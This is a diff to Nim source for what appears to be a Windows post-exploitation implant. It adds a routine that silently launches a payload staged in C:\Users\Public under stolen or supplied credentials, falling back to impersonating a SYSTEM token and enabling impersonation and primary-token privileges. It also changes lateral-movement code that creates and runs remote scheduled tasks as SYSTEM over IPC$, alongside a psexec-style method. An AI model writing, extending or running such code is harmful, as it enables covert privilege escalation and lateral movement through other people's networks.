@@ -61,6 +61,14 @@ when defined(windows):
     lpProcessInformation: ptr PROCESS_INFORMATION
   ): WINBOOL {.importc, stdcall, dynlib: "advapi32".}
 
+  proc CreateProcessWithLogonW(
+    lpUsername: LPCWSTR, lpDomain: LPCWSTR, lpPassword: LPCWSTR,
+    dwLogonFlags: DWORD, lpApplicationName: LPCWSTR,
+    lpCommandLine: LPWSTR, dwCreationFlags: DWORD, lpEnvironment: pointer,
+    lpCurrentDirectory: LPCWSTR, lpStartupInfo: ptr STARTUPINFOW,
+    lpProcessInformation: ptr PROCESS_INFORMATION
+  ): WINBOOL {.importc, stdcall, dynlib: "advapi32".}
+
   proc OpenThreadToken(
     ThreadHandle: HANDLE, DesiredAccess: DWORD,
     OpenAsSelf: WINBOOL, TokenHandle: ptr HANDLE
@@ -777,6 +785,113 @@ when defined(windows):
     # TRUE from AdjustTokenPrivileges can still mean ERROR_NOT_ALL_ASSIGNED.
     return GetLastError() != DWORD(1300) # ERROR_NOT_ALL_ASSIGNED
 
+  proc spawnAsUserDirect(path, account, password: string;
+                         pid: var DWORD): tuple[ok: bool, methodName: string, detail: string] =
+    ## Credential-backed RunAs: create the child immediately.  The first path
+    ## Start immediately with supplied credentials; token APIs are retained
+    ## for hosts where Secondary Logon is unavailable.
+    var domain = "."
+    var username = account
+    let slash = account.find('\\')
+    if slash >= 0:
+      domain = account[0..<slash]
+      username = account[slash + 1..^1]
+    else:
+      let at = account.find('@')
+      if at >= 0:
+        username = account[0..<at]
+        domain = account[at + 1..^1]
+    if username.len == 0 or password.len == 0:
+      return (false, "", "invalid username or password")
+
+    let userW = newWideCString(username)
+    let domainW = if domain.len == 0: cast[LPCWSTR](nil) else: newWideCString(domain)
+    let passW = newWideCString(password)
+    let pathW = newWideCString(path)
+    let cwdW = newWideCString("C:\\Windows\\System32")
+    var si: STARTUPINFOW
+    zeroMem(addr si, sizeof(si))
+    si.cb = DWORD(sizeof(si))
+    si.dwFlags = DWORD(STARTF_USESHOWWINDOW)
+    si.wShowWindow = WORD(SW_HIDE)
+    var pi: PROCESS_INFORMATION
+    zeroMem(addr pi, sizeof(pi))
+
+    var cmdW = newWideCString("\"" & path & "\"")
+    if CreateProcessWithLogonW(userW, domainW, passW, 0, pathW, cmdW,
+        CREATE_NO_WINDOW, nil, cwdW, addr si, addr pi) != 0:
+      pid = pi.dwProcessId
+      discard CloseHandle(pi.hThread); discard CloseHandle(pi.hProcess)
+      return (true, "CreateProcessWithLogonW", "")
+    let logonErr = GetLastError()
+
+    var impersonated = false
+    if gSystemToken != 0 and ImpersonateLoggedOnUser(gSystemToken) != 0:
+      impersonated = true
+      discard enablePriv(gSystemToken, "SeImpersonatePrivilege")
+      discard enablePriv(gSystemToken, "SeIncreaseQuotaPrivilege")
+      discard enablePriv(gSystemToken, "SeAssignPrimaryTokenPrivilege")
+    var selfToken: HANDLE = 0
+    if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY,
+        addr selfToken) != 0:
+      discard enablePriv(selfToken, "SeImpersonatePrivilege")
+      discard enablePriv(selfToken, "SeIncreaseQuotaPrivilege")
+      discard enablePriv(selfToken, "SeAssignPrimaryTokenPrivilege")
+      discard CloseHandle(selfToken)
+
+    var userToken: HANDLE = 0
+    var batchErr: DWORD = 0
+    var interactiveErr: DWORD = 0
+    var logged = LogonUserW(userW, domainW, passW,
+      LOGON32_LOGON_BATCH, LOGON32_PROVIDER_DEFAULT, addr userToken)
+    if logged == 0:
+      batchErr = GetLastError()
+      logged = LogonUserW(userW, domainW, passW,
+        LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, addr userToken)
+      if logged == 0: interactiveErr = GetLastError()
+
+    var created = WINBOOL(0)
+    var methodName = ""
+    var asUserErr: DWORD = 0
+    var withTokenErr: DWORD = 0
+    if logged != 0:
+      var cmdAsUser = newWideCString("\"" & path & "\"")
+      created = CreateProcessAsUserW(userToken, pathW, cmdAsUser, nil, nil,
+        WINBOOL(0), CREATE_NO_WINDOW, nil, cwdW, addr si, addr pi)
+      if created != 0:
+        methodName = "CreateProcessAsUserW"
+      else:
+        asUserErr = GetLastError()
+      if created == 0:
+        var cmdWithToken = newWideCString("\"" & path & "\"")
+        created = CreateProcessWithTokenW(userToken, 0, pathW, cmdWithToken,
+          CREATE_NO_WINDOW, nil, cwdW, addr si, addr pi)
+        if created != 0:
+          methodName = "CreateProcessWithTokenW"
+        else:
+          withTokenErr = GetLastError()
+
+    if created != 0:
+      pid = pi.dwProcessId
+      discard CloseHandle(pi.hThread); discard CloseHandle(pi.hProcess)
+      discard CloseHandle(userToken)
+      if impersonated: discard RevertToSelf()
+      return (true, methodName, "")
+
+    if userToken != 0: discard CloseHandle(userToken)
+    if impersonated: discard RevertToSelf()
+    return (false, "", "CreateProcessWithLogonW=" & $logonErr &
+      " batch=" & $batchErr & " interactive=" & $interactiveErr &
+      " AsUser=" & $asUserErr & " WithToken=" & $withTokenErr)
+
+  proc runasStartTime(): string =
+    let t = now()
+    var total = t.hour * 60 + t.minute + 2
+    total = total mod (24 * 60)
+    let hh = if total div 60 < 10: "0" & $(total div 60) else: $(total div 60)
+    let mm = if total mod 60 < 10: "0" & $(total mod 60) else: $(total mod 60)
+    return hh & ":" & mm
+
   proc normalizeTokenSession(token: HANDLE) =
     ## Adjust token's session ID to match our process so cmd.exe can initialise
     ## user32.dll.  A cross-session token (winlogon = Session 1, agent = Session 0)
@@ -1436,7 +1551,8 @@ when defined(windows):
       if user != "":
         out2.add(runShell("net use \\\\" & host & "\\IPC$ \"" & pass &
           "\" /user:\"" & user & "\" 2>&1") & "\n")
-      out2.add(runShell("schtasks /Create /S " & host & " /RU SYSTEM /SC ONCE /ST 00:00 /F /TN " &
+      let atStart = runasStartTime()
+      out2.add(runShell("schtasks /Create /S " & host & " /RU SYSTEM /SC ONCE /ST " & atStart & " /F /TN " &
         tn & " /TR \"" & cmd & "\" 2>&1") & "\n")
       out2.add(runShell("schtasks /Run /S " & host & " /TN " & tn & " 2>&1") & "\n")
       Sleep(DWORD(3000))
@@ -1458,10 +1574,17 @@ when defined(windows):
         except:
           return "runas: could not stage payload in C:\\Users\\Public"
       if not fileExists(pubPath): return "runas: staged payload is not readable"
-      let createOut = runShell("schtasks /Create /SC ONCE /ST 00:00 /RL HIGHEST /F /TN \"" & tn &
+      var directPid: DWORD = 0
+      let direct = spawnAsUserDirect(pubPath, user, pass, directPid)
+      if direct.ok:
+        return "[+] runas → " & ru & " @ " & host & "\n    cmd: " & pubPath &
+          "\n    pid: " & $directPid & "\n    method: " & direct.methodName
+
+      let startAt = runasStartTime()
+      let createOut = runShell("schtasks /Create /SC ONCE /ST " & startAt & " /RL HIGHEST /F /TN \"" & tn &
         "\" /TR \"" & effCmd & "\" /RU \"" & ru & "\" /RP \"" & pass & "\" 2>&1")
       if createOut.toUpperAscii().contains("ERROR:") or createOut.toLowerAscii().startsWith("[error:"):
-        return "runas: schtasks /Create failed\n" & createOut
+        return "runas: direct launch failed\n" & direct.detail & "\nrunas: schtasks /Create failed\n" & createOut
       var out2 = createOut & "\n"
       let runOut = runShell("schtasks /Run /TN \"" & tn & "\" 2>&1")
       if runOut.toUpperAscii().contains("ERROR:") or runOut.toLowerAscii().startsWith("[error:"):
@@ -1470,7 +1593,9 @@ when defined(windows):
       out2.add(runOut & "\n")
       Sleep(DWORD(3000))
       out2.add(runShell("schtasks /Delete /TN \"" & tn & "\" /F 2>&1") & "\n")
-      return "[+] runas → " & ru & " @ " & host & "\n    cmd: " & effCmd & "\n" & out2
+      return "[+] runas → " & ru & " @ " & host & "\n    cmd: " & effCmd &
+        "\n    method: schtasks fallback (/ST " & startAt & ")\n    direct launch failed: " &
+        direct.detail & "\n" & out2
     elif meth == "psexec":
       let svcName = "svc" & toHex(uint32(getTime().toUnix() and 0xFFFFFFFF'i64), 8)
       let exeName = svcName & ".exe"
